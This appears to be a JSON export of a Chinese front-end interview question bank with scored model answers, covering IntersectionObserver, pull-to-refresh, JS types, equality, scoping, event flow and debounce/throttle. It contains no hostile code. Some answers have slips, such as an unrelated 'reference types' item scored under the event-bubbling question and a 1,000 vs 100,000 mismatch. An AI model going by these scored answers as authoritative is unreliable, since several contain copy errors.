会好很多</p>\\n<p>使用步骤主要分为两步：创建观察者和传入被观察者</p>\\n<h6>创建观察者</h6>\\n<pre><code class=\\"language-js\\">const options = {\\n  // 表示重叠面积占被观察者的比例，从 0 - 1 取值，\\n  // 1 表示完全被包含\\n  threshold: 1.0, \\n  root:document.querySelector(&#39;#scrollArea&#39;) // 必须是目标元素的父级元素\\n};\\n\\nconst callback = (entries, observer) =&gt; { ....}\\n\\nconst observer = new IntersectionObserver(callback, options);\\n</code></pre>\\n<p>通过<code>new IntersectionObserver</code>创建了观察者 <code>observer</code>，传入的参数 <code>callback</code> 在重叠比例超过 <code>threshold</code> 时会被执行`</p>\\n<p>关于<code>callback</code>回调函数常用属性如下：</p>\\n<pre><code class=\\"language-js\\">// 上段代码中被省略的 callback\\nconst callback = function(entries, observer) { \\n    entries.forEach(entry =&gt; {\\n        entry.time;               // 触发的时间\\n        entry.rootBounds;         // 根元素的位置矩形，这种情况下为视窗位置\\n        entry.boundingClientRect; // 被观察者的位置举行\\n        entry.intersectionRect;   // 重叠区域的位置矩形\\n        entry.intersectionRatio;  // 重叠区域占被观察者面积的比例（被观察者不是矩形时也按照矩形计算）\\n        entry.target;             // 被观察者\\n    });\\n};\\n</code></pre>\\n<h6>传入被观察者</h6>\\n<p>通过 <code>observer.observe(target)</code> 这一行代码即可简单的注册被观察者</p>\\n<pre><code class=\\"language-js\\">const target = document.querySelector(&#39;.target&#39;);\\nobserver.observe(target);\\n</code></pre>\\n<h5>4）案例分析</h5>\\n<p>实现：创建了一个十万个节点的长列表，当节点滚入到视窗中时，背景就会从红色变为黄色</p>\\n<p><code>Html</code>结构如下：</p>\\n<pre><code class=\\"language-js\\">&lt;div class=&quot;container&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<p><code>css</code>样式如下：</p>\\n<pre><code class=\\"language-css\\">.container {\\n    display: flex;\\n    flex-wrap: wrap;\\n}\\n.target {\\n    margin: 5px;\\n    width: 20px;\\n    height: 20px;\\n    background: red;\\n}\\n</code></pre>\\n<p>往<code>container</code>插入1000个元素</p>\\n<pre><code class=\\"language-js\\">const $container = $(&quot;.container&quot;);\\n\\n// 插入 100000 个 &lt;div class=&quot;target&quot;&gt;&lt;/div&gt;\\nfunction createTargets() {\\n  const htmlString = new Array(100000)\\n    .fill(&#39;&lt;div class=&quot;target&quot;&gt;&lt;/div&gt;&#39;)\\n    .join(&quot;&quot;);\\n  $container.html(htmlString);\\n}\\n</code></pre>\\n<p>这里，首先使用 <code>getBoundingClientRect</code> 方法进行判断元素是否在可视区域</p>\\n<pre><code class=\\"language-js\\">function isInViewPort(element) {\\n    const viewWidth = window.innerWidth || document.documentElement.clientWidth;\\n    const viewHeight =\\n          window.innerHeight || document.documentElement.clientHeight;\\n    const { top, right, bottom, left } = element.getBoundingClientRect();\\n\\n    return top &gt;= 0 &amp;&amp; left &gt;= 0 &amp;&amp; right &lt;= viewWidth &amp;&amp; bottom &lt;= viewHeight;\\n}\\n</code></pre>\\n<p>然后开始监听<code>scroll</code>事件，判断页面上哪些元素在可视区域中，如果在可视区域中则将背景颜色设置为<code>yellow</code></p>\\n<pre><code class=\\"language-js\\">$(window).on(&quot;scroll&quot;, () =&gt; {\\n    console.log(&quot;scroll !&quot;);\\n    $targets.each((index, element) =&gt; {\\n        if (isInViewPort(element)) {\\n            $(element).css(&quot;background-color&quot;, &quot;yellow&quot;);\\n        }\\n    });\\n});\\n</code></pre>\\n<p>通过上述方式，可以看到可视区域颜色会变成黄色了，但是可以明显看到有卡顿的现象，原因在于我们绑定了<code>scroll</code>事件，<code>scroll</code>事件伴随了大量的计算，会造成资源方面的浪费</p>\\n<p>下面通过<code>Intersection Observer</code>的形式同样实现相同的功能</p>\\n<p>首先创建一个观察者</p>\\n<pre><code class=\\"language-js\\">const observer = new IntersectionObserver(getYellow, { threshold: 1.0 });\\n</code></pre>\\n<p><code>getYellow</code>回调函数实现对背景颜色改变，如下：</p>\\n<pre><code class=\\"language-js\\">function getYellow(entries, observer) {\\n    entries.forEach(entry =&gt; {\\n        $(entry.target).css(&quot;background-color&quot;, &quot;yellow&quot;);\\n    });\\n}\\n</code></pre>\\n<p>最后传入观察者，即<code>.target</code>元素</p>\\n<pre><code class=\\"language-js\\">$targets.each((index, element) =&gt; {\\n    observer.observe(element);\\n});\\n</code></pre>\\n<p>可以看到功能同样完成，并且页面不会出现卡顿的情况</p>\\n</details>\\n\\n<h2>如何实现一个上拉加载，下拉刷新？</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> 上拉加载</li>\\n</ul>\\n<p>首先可以看一张图</p>\\n<p><img src=\\"/public/images/3_JavaScript_20241230002614.png\\" alt=\\"\\"></p>\\n<p>上拉加载的本质是页面触底，或者快要触底时的动作</p>\\n<p>判断页面触底我们需要先了解一下下面几个属性</p>\\n<ul>\\n<li><p><code>scrollTop</code>：滚动视窗的高度距离<code>window</code>顶部的距离，它会随着往上滚动而不断增加，初始值是0，它是一个变化的值</p>\\n</li>\\n<li><p><code>clientHeight</code>:它是一个定值，表示屏幕可视区域的高度；</p>\\n</li>\\n<li><p><code>scrollHeight</code>：页面不能滚动时也是存在的,此时scrollHeight等于clientHeight。scrollHeight表示<code>body</code>所有元素的总长度(包括body元素自身的padding)</p>\\n</li>\\n</ul>\\n<p>综上我们得出一个触底公式：</p>\\n<pre><code class=\\"language-js\\">scrollTop + clientHeight &gt;= scrollHeight\\n</code></pre>\\n<p>简单实现</p>\\n<pre><code class=\\"language-js\\">let clientHeight  = document.documentElement.clientHeight; //浏览器高度\\nlet scrollHeight = document.body.scrollHeight;\\nlet scrollTop = document.documentElement.scrollTop;\\n \\nlet distance = 50;  //距离视窗还用50的时候，开始触发；\\n\\nif ((scrollTop + clientHeight) &gt;= (scrollHeight - distance)) {\\n    console.log(&quot;开始加载数据&quot;);\\n}\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 下拉刷新</li>\\n</ul>\\n<p>下拉刷新的本质是页面本身置于顶部时，用户下拉时需要触发的动作</p>\\n<p>关于下拉刷新的原生实现，主要分成三步：</p>\\n<ul>\\n<li>监听原生<code>touchstart</code>事件，记录其初始位置的值，<code>e.touches[0].pageY</code>；</li>\\n<li>监听原生<code>touchmove</code>事件，记录并计算当前滑动的位置值与初始位置值的差值，大于<code>0</code>表示向下拉动，并借助CSS3的<code>translateY</code>属性使元素跟随手势向下滑动对应的差值，同时也应设置一个允许滑动的最大值；</li>\\n<li>监听原生<code>touchend</code>事件，若此时元素滑动达到最大值，则触发<code>callback</code>，同时将<code>translateY</code>重设为<code>0</code>，元素回到初始位置</li>\\n</ul>\\n<p>举个例子：</p>\\n<p><code>Html</code>结构如下：</p>\\n<pre><code class=\\"language-js\\">&lt;main&gt;\\n    &lt;p class=&quot;refreshText&quot;&gt;&lt;/p &gt;\\n    &lt;ul id=&quot;refreshContainer&quot;&gt;\\n        &lt;li&gt;111&lt;/li&gt;\\n        &lt;li&gt;222&lt;/li&gt;\\n        &lt;li&gt;333&lt;/li&gt;\\n        &lt;li&gt;444&lt;/li&gt;\\n        &lt;li&gt;555&lt;/li&gt;\\n        ...\\n    &lt;/ul&gt;\\n&lt;/main&gt;\\n</code></pre>\\n<p>监听<code>touchstart</code>事件，记录初始的值</p>\\n<pre><code class=\\"language-js\\">var _element = document.getElementById(&#39;refreshContainer&#39;),\\n    _refreshText = document.querySelector(&#39;.refreshText&#39;),\\n    _startPos = 0,  // 初始的值\\n    _transitionHeight = 0; // 移动的距离\\n\\n_element.addEventListener(&#39;touchstart&#39;, function(e) {\\n    _startPos = e.touches[0].pageY; // 记录初始位置\\n    _element.style.position = &#39;relative&#39;;\\n    _element.style.transition = &#39;transform 0s&#39;;\\n}, false);\\n</code></pre>\\n<p>监听<code>touchmove</code>移动事件，记录滑动差值</p>\\n<pre><code class=\\"language-js\\">_element.addEventListener(&#39;touchmove&#39;, function(e) {\\n    // e.touches[0].pageY 当前位置\\n    _transitionHeight = e.touches[0].pageY - _startPos; // 记录差值\\n\\n    if (_transitionHeight &gt; 0 &amp;&amp; _transitionHeight &lt; 60) { \\n        _refreshText.innerText = &#39;下拉刷新&#39;; \\n        _element.style.transform = &#39;translateY(&#39;+_transitionHeight+&#39;px)&#39;;\\n\\n        if (_transitionHeight &gt; 55) {\\n            _refreshText.innerText = &#39;释放更新&#39;;\\n        }\\n    }                \\n}, false);\\n</code></pre>\\n<p>最后，就是监听<code>touchend</code>离开的事件</p>\\n<pre><code class=\\"language-js\\">_element.addEventListener(&#39;touchend&#39;, function(e) {\\n    _element.style.transition = &#39;transform 0.5s ease 1s&#39;;\\n    _element.style.transform = &#39;translateY(0px)&#39;;\\n    _refreshText.innerText = &#39;更新中...&#39;;\\n    // todo...\\n\\n}, false);\\n</code></pre>\\n<p>从上面可以看到，在下拉到松手的过程中，经历了三个阶段：</p>\\n<ul>\\n<li><p>当前手势滑动位置与初始位置差值大于零时，提示正在进行下拉刷新操作</p>\\n</li>\\n<li><p>下拉到一定值时，显示松手释放后的操作提示</p>\\n</li>\\n<li><p>下拉到达设定最大值松手时，执行回调，提示正在进行更新操作</p>\\n</li>\\n<li><p><strong>2：</strong> 案例</p>\\n</li>\\n</ul>\\n<p>在实际开发中，我们更多的是使用第三方库，下面以<code>better-scroll</code>进行举例：</p>\\n<p>HTML结构</p>\\n<pre><code class=\\"language-js\\">&lt;div id=&quot;position-wrapper&quot;&gt;\\n    &lt;div&gt;\\n        &lt;p class=&quot;refresh&quot;&gt;下拉刷新&lt;/p &gt;\\n        &lt;div class=&quot;position-list&quot;&gt;\\n   &lt;!--列表内容--&gt;\\n        &lt;/div&gt;\\n        &lt;p class=&quot;more&quot;&gt;查看更多&lt;/p &gt;\\n    &lt;/div&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>实例化上拉下拉插件，通过<code>use</code>来注册插件</p>\\n<pre><code class=\\"language-js\\">import BScroll from &quot;@better-scroll/core&quot;;\\nimport PullDown from &quot;@better-scroll/pull-down&quot;;\\nimport PullUp from &#39;@better-scroll/pull-up&#39;;\\nBScroll.use(PullDown);\\nBScroll.use(PullUp);\\n</code></pre>\\n<p>实例化<code>BetterScroll</code>，并传入相关的参数</p>\\n<pre><code class=\\"language-js\\">let pageNo = 1,pageSize = 10,dataList = [],isMore = true;  \\nvar scroll= new BScroll(&quot;#position-wrapper&quot;,{\\n    scrollY:true,//垂直方向滚动\\n    click:true,//默认会阻止浏览器的原生click事件，如果需要点击，这里要设为true\\n    pullUpLoad:true,//上拉加载更多\\n    pullDownRefresh:{\\n        threshold:50,//触发pullingDown事件的位置\\n        stop:0//下拉回弹后停留的位置\\n    }\\n});\\n//监听下拉刷新\\nscroll.on(&quot;pullingDown&quot;,pullingDownHandler);\\n//监测实时滚动\\nscroll.on(&quot;scroll&quot;,scrollHandler);\\n//上拉加载更多\\nscroll.on(&quot;pullingUp&quot;,pullingUpHandler);\\n\\nasync function pullingDownHandler(){\\n    dataList=[];\\n    pageNo=1;\\n    isMore=true;\\n    $(&quot;.more&quot;).text(&quot;查看更多&quot;);\\n    await getlist();//请求数据\\n    scroll.finishPullDown();//每次下拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作\\n}\\nasync function pullingUpHandler(){\\n    if(!isMore){\\n        $(&quot;.more&quot;).text(&quot;没有更多数据了&quot;);\\n        scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n        return;\\n    }\\n    pageNo++;\\n    await this.getlist();//请求数据\\n    scroll.finishPullUp();//每次上拉结束后，需要执行这个操作\\n    scroll.refresh();//当滚动区域的dom结构有变化时，需要执行这个操作    \\n}\\nfunction scrollHandler(){\\n    if(this.y&gt;50) $(&#39;.refresh&#39;).text(&quot;松手开始加载&quot;);\\n    else $(&#39;.refresh&#39;).text(&quot;下拉刷新&quot;);\\n}\\nfunction getlist(){\\n    //返回的数据\\n    let result=....;\\n    dataList=dataList.concat(result);\\n    //判断是否已加载完\\n    if(result.length&lt;pageSize) isMore=false;\\n    //将dataList渲染到html内容中\\n}    \\n</code></pre>\\n<p>注意点：</p>\\n<p>使用 <code>better-scroll</code> 实现下拉刷新、上拉加载时要注意以下几点：</p>\\n<ul>\\n<li><code>wrapper</code> 里必须只有一个子元素</li>\\n<li>子元素的高度要比 <code>wrapper</code> 要高</li>\\n<li>使用的时候，要确定 <code>DOM</code> 元素是否已经生成，必须要等到 <code>DOM</code> 渲染完成后，再 <code>new BScroll()</code></li>\\n<li>滚动区域的 <code>DOM</code> 元素结构有变化后，需要执行刷新 <code>refresh()</code></li>\\n<li>上拉或者下拉，结束后，需要执行 <code>finishPullUp()</code> 或者 <code>finishPullDown()</code>，否则将不会执行下次操作</li>\\n<li><code>better-scroll</code>，默认会阻止浏览器的原生 <code>click</code> 事件，如果滚动内容区要添加点击事件，需要在实例化属性里设置 <code>click:true</code></li>\\n</ul>\\n</details>\\n","ast":[{"type":"heading","raw":"# JavaScript\\n\\n","depth":1,"text":"JavaScript","tokens":[{"type":"text","raw":"JavaScript","text":"JavaScript","escaped":false}]},{"type":"heading","raw":"## JS 数据类型有哪些？\\n\\n","depth":2,"text":"JS 数据类型有哪些？","tokens":[{"type":"text","raw":"JS 数据类型有哪些？","text":"JS 数据类型有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；\\n- **1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；\\n","task":false,"loose":false,"text":"**1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","tokens":[{"type":"text","raw":"**1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","text":"**1：** 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","text":" 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","task":false,"loose":false,"text":"**1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"text","raw":"**1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":"**1：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## == 和 === 的区别是什么？\\n\\n","depth":2,"text":"== 和 === 的区别是什么？","tokens":[{"type":"text","raw":"== 和 === 的区别是什么？","text":"== 和 === 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;\\n- **1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;\\n","task":false,"loose":false,"text":"**1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","tokens":[{"type":"text","raw":"**1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","text":"**1：** == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","text":" == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，\'5\' == 5 为 true;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","task":false,"loose":false,"text":"**1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","tokens":[{"type":"text","raw":"**1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","text":"**1：** === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","text":" === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，\'5\' === 5 为 false;","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## var 、let 、 const 的区别是什么？\\n\\n","depth":2,"text":"var 、let 、 const 的区别是什么？","tokens":[{"type":"text","raw":"var 、let 、 const 的区别是什么？","text":"var 、let 、 const 的区别是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n              提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;\\n- **1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n          提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;\\n- **1：** 区别:\\n            const： 需要在声明时初始化，且之后不能被修改;\\n            let：可以修改其值;\\n            var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n              提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;\\n","task":false,"loose":false,"text":"**1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n            提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","tokens":[{"type":"text","raw":"**1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n\\n            提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","text":"**1：** var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","text":" var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n          提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;\\n","task":false,"loose":false,"text":"**1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n        提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","tokens":[{"type":"text","raw":"**1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n\\n        提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","text":"**1：** let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","text":" let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 区别:\\n            const： 需要在声明时初始化，且之后不能被修改;\\n            let：可以修改其值;\\n            var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","task":false,"loose":false,"text":"**1：** 区别:\\n          const： 需要在声明时初始化，且之后不能被修改;\\n          let：可以修改其值;\\n          var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","tokens":[{"type":"text","raw":"**1：** 区别:\\n\\n          const： 需要在声明时初始化，且之后不能被修改;\\n          let：可以修改其值;\\n          var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","text":"**1：** 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","text":" 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是事件冒泡和事件捕获？\\n\\n","depth":2,"text":"什么是事件冒泡和事件捕获？","tokens":[{"type":"text","raw":"什么是事件冒泡和事件捕获？","text":"什么是事件冒泡和事件捕获？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;\\n- **1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;\\n- **1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;\\n- **2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;\\n","task":false,"loose":false,"text":"**1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;","tokens":[{"type":"text","raw":"**1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;","text":"**1：** 事件冒泡：事件从目标元素开始，向上冒泡到 document;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件冒泡：事件从目标元素开始，向上冒泡到 document;","text":" 事件冒泡：事件从目标元素开始，向上冒泡到 document;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;\\n","task":false,"loose":false,"text":"**1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;","tokens":[{"type":"text","raw":"**1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;","text":"**1：** 事件捕获：事件从 document 开始，向下捕获到目标元素;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件捕获：事件从 document 开始，向下捕获到目标元素;","text":" 事件捕获：事件从 document 开始，向下捕获到目标元素;","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;\\n","task":false,"loose":false,"text":"**1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","tokens":[{"type":"text","raw":"**1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","text":"**1：** 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","text":" 事件流顺序: 1.捕获 -> 2.目标 -> 3.冒泡;","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","task":false,"loose":false,"text":"**2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"text","raw":"**2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":"**2：** 引用类型：对象（Object）、函数（Function）、数组（Array）等；","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","text":" 引用类型：对象（Object）、函数（Function）、数组（Array）等；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## JS 什么是防抖和节流？它们的应用场景有哪些？\\n\\n","depth":2,"text":"JS 什么是防抖和节流？它们的应用场景有哪些？","tokens":[{"type":"text","raw":"JS 什么是防抖和节流？它们的应用场景有哪些？","text":"JS 什么是防抖和节流？它们的应用场景有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`\\n\\n","depth":4,"text":"级别：`W1`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。\\n- **2：** 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 